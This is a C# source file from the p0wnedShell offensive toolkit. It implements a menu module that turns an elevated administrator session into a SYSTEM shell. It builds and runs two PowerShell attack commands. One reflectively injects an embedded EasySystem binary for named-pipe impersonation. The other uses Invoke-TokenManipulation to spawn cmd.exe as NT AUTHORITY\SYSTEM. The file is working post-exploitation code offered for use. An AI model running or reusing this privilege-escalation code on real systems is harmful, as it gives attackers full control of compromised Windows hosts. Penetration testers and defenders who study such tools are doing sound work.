using System;

namespace p0wnedShell
{
    class GetSystem
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Get a SYSTEM shell using EasySystem or Token Manipulation         *"};
            Program.PrintBanner(toPrint);
        }

        public static void Menu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Get a SYSTEM shell using EasySystem (NamedPipe Impersonation).");
            Console.WriteLine();
            Console.WriteLine(" 2. Get a SYSTEM shell using Token Manipulation.");
            Console.WriteLine();
            Console.WriteLine(" 3. Back.");
            Console.Write("\nEnter choice: ");

            string osArch = "x86";
            if (Pshell.EnvironmentHelper.Is64BitOperatingSystem())
            {
                osArch = "x64";
            }

            string procArch = "x86";
            if (Pshell.EnvironmentHelper.Is64BitProcess())
            {
                procArch = "x64";
            }

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 3)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    if (procArch != osArch)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Your OS Architectecture does not match the version of p0wnedShell you run.");
                        Console.WriteLine("[+] To run EasySystem, you should run the " + osArch + " version of p0wnedShell\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else if (!Program.IsElevated)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        SystemShell(osArch);
                    }
                    break;
                case 2:
                    if (!Program.IsElevated)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        TokenShell();
                    }
                    break;
                default:
                    break;
            }
        }

        public static void SystemShell(string osArch)
        {
            string[] toPrint = { "* Get a SYSTEM shell using EasySystem (NamedPipe Impersonation)     *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait for our SYSTEM PowerShell to Popup...\n");
            string SystemShell = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Easy_System(osArch) + "\" -split ' ') -ForceASLR";
            try
            {
                P0wnedListener.Execute(SystemShell);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.WriteLine("[+] Press Enter to Continue...");
            Console.ReadLine();

            return;
        }

        public static void TokenShell()
        {
            string[] toPrint = { "* Get a SYSTEM shell using Token Manipulation                       *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait for our SYSTEM shell to Popup...\n");
            string SystemShell = "Invoke-TokenManipulation -CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"";
            try
            {
                P0wnedListener.Execute(SystemShell);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            return;
        }

    }
}